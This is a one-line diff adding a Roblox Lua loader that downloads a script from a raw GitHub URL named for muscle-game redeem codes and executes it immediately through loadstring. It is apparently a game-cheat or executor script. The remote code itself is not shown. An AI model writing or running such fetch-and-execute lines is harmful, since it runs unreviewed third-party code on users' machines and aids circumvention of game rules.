@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AverageRobloxUser1/MuscleRedeemCodes/main/MuscleRedeemCodes1",true))();
